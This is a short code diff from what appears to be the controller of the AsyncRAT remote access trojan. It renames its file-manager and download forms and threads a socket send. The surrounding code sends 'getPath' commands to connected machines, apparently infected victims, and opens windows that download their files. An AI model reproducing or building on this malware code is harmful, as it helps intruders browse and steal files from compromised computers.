@@ -7,9 +7,9 @@ using System.IO;
 
 namespace AsyncRAT_Sharp.Forms
 {
-    public partial class FileManager : Form
+    public partial class FormFileManager : Form
     {
-        public FileManager()
+        public FormFileManager()
         {
             InitializeComponent();
         }
@@ -55,7 +55,7 @@ namespace AsyncRAT_Sharp.Forms
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = path + "\\";
                 toolStripStatusLabel1.Text = path;
-                C.BeginSend(msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
             }
             catch
             {
@@ -84,10 +84,10 @@ namespace AsyncRAT_Sharp.Forms
                         ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
-                            DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                            FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                             if (SD == null)
                             {
-                                SD = new DownloadFile
+                                SD = new FormDownloadFile
                                 {
                                     Name = "socketDownload:" + dwid,
                                     Text = "socketDownload:" + C.ID,
